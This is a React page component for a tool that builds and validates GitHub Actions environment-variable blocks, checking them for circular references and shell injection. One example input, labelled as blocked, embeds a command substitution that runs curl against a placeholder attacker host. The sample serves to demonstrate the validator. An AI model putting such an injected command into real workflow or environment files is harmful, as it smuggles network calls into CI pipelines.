'use client';

import { useMemo, useState } from 'react';
// parse-env.js is the single source of truth shared with CI.
// eslint-disable-next-line @typescript-eslint/no-require-imports
const {
  parseEnvBlock,
  PINNED_SHA,
  PINNED_TAG,
} = require('../lib/parse-env.js') as {
  parseEnvBlock: (
    text: string,
    options?: { existingEnv?: Record<string, string>; continueOnError?: boolean }
  ) => {
    ok: boolean;
    resolved: Record<string, string>;
    findings: Array<{
      severity: 'error' | 'warning';
      code: string;
      message: string;
      line?: number;
      name?: string;
    }>;
    workflowSnippet: string;
    githubEnv: string;
  };
  PINNED_SHA: string;
  PINNED_TAG: string;
};

const EXAMPLES: Record<string, string> = {
  Simple: `SOME_FLAG=1
THIS_GREETING=hello
WITH_SPACES="a value with spaces"`,
  Referencing: `ONE=one
TWO=two
ONETWOTHREE="$ONE $TWO three"`,
  'Shell defaults': `THAT_VALUE="\${THIS_GREETING:-hi} \${LOCATION:-world}"
ABS_SUBDIR="$(pwd)/test"`,
  'Injection (blocked)': `SAFE=ok
BAD="$(curl evil.test)"
LATER=still-ok`,
  Circular: `A=$B
B=$C
C=$A`,
};

const DEFAULT_BLOCK = EXAMPLES.Simple;

export default function HomePage() {
  const [block, setBlock] = useState(DEFAULT_BLOCK);
  const [copied, setCopied] = useState<'snippet' | 'github' | null>(null);

  const result = useMemo(() => parseEnvBlock(block), [block]);

  async function copy(text: string, kind: 'snippet' | 'github') {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(kind);
      setTimeout(() => setCopied(null), 1500);
    } catch {
      setCopied(null);
    }
  }

  return (
    <div className="container">
      <section className="hero">
        <span className="pill">Production app · WR #15863</span>
        <h1>Easy Env Vars</h1>
        <p>
          Compose multi-line <code>NAME=value</code> blocks for GitHub Actions.
          Variables resolve in order so later values can reference earlier ones
          with bash-style expansion. Every block is scanned for malformed names,
          circular references, and shell injection before it is exported for{' '}
          <code>briantist/ezenv@{PINNED_TAG}</code>.
        </p>
      </section>

      <div className="grid">
        <section className="panel">
          <h2>Env block editor</h2>
          <p className="help">
            One assignment per line. Comments start with <code>#</code>. Quote
            values that contain spaces. Allowed command substitutions:{' '}
            <code>$(pwd)</code>, <code>$(echo …)</code>.
          </p>

          <div className="examples">
            {Object.keys(EXAMPLES).map((label) => (
              <button
                key={label}
                type="button"
                className="chip"
                onClick={() => setBlock(EXAMPLES[label])}
              >
                {label}
              </button>
            ))}
          </div>

          <textarea
            value={block}
            onChange={(event) => setBlock(event.target.value)}
            spellCheck={false}
            aria-label="Environment variable definitions"
          />

          <div className="actions">
            <button
              type="button"
              className="btn btn-primary"
              onClick={() => copy(result.workflowSnippet, 'snippet')}
              disabled={!result.ok}
            >
              {copied === 'snippet' ? 'Copied workflow' : 'Copy workflow snippet'}
            </button>
            <button
              type="button"
              className="btn btn-secondary"
              onClick={() => copy(result.githubEnv, 'github')}
              disabled={!result.ok}
            >
              {copied === 'github' ? 'Copied GITHUB_ENV' : 'Copy GITHUB_ENV lines'}
            </button>
            <button
              type="button"
              className="btn btn-ghost"
              onClick={() => setBlock(DEFAULT_BLOCK)}
            >
              Reset
            </button>
          </div>
        </section>

        <aside className="panel">
          <h2>
            Validation{' '}
            <span className={`status ${result.ok ? 'status-ok' : 'status-bad'}`}>
              {result.ok ? 'OK' : 'Blocked'}
            </span>
          </h2>
          <p className="help">
            Pinned action:{' '}
            <code>
              briantist/ezenv@{PINNED_SHA.slice(0, 12)}
            </code>
          </p>

          {result.findings.length === 0 ? (
            <p className="help">No findings. Safe to use with the workflow.</p>
          ) : (
            <ul className="findings">
              {result.findings.map((finding, index) => (
                <li key={`${finding.code}-${index}`} className={finding.severity}>
                  <strong>{finding.severity}</strong>
                  {finding.line ? ` · line ${finding.line}` : ''}: {finding.message}
                </li>
              ))}
            </ul>
          )}

          <h2 style={{ marginTop: '1.25rem' }}>Resolved values</h2>
          {Object.keys(result.resolved).length === 0 ? (
            <p className="help">Nothing resolved yet.</p>
          ) : (
            <div className="kv">
              {Object.entries(result.resolved).map(([name, value]) => (
                <div className="kv-row" key={name}>
                  <span>{name}</span>
                  <span>{value}</span>
                </div>
              ))}
            </div>
          )}

          <h2 style={{ marginTop: '1.25rem' }}>Workflow snippet</h2>
          <pre className="snippet">{result.workflowSnippet}</pre>

          <p className="meta">
            CI workflow: <code>.github/workflows/easy-env-vars.yml</code>
            <br />
            Pre-validation CLI:{' '}
            <code>products/easy-env-vars/lib/validate-cli.js</code>
            <br />
            Live test URL: see README (Vercel).
          </p>
        </aside>
      </div>
    </div>
  );
}
